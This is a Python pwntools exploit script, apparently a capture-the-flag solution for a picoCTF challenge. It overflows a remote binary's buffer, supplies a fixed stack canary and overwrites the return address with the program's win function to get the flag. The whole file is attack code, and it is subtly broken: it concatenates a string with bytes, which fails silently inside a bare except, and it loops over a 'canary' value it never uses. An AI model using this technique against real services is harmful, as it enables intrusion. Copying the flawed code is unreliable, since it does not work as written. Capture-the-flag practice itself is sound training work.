#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './vuln' 

LOCAL = False

os.system('clear')

e = ELF(fname)
for i in range(0, 0xffffffff+1):
  r = remote('saturn.picoctf.net', 49821)
  canary = p32(i)
  print(f'Tries: {i}', end='\r')
  try:
    r.sendline('88')
    payload = b'B'*(64) + 'BiRd' + b'AAAA'*4 + p32(e.sym.win)
    r.sendline(payload)
    print(r.recvline_contains('pico'))
    print(f'Canary: {canary}')
    pause()
  except:
    pass
    r.close()

r.interactive()
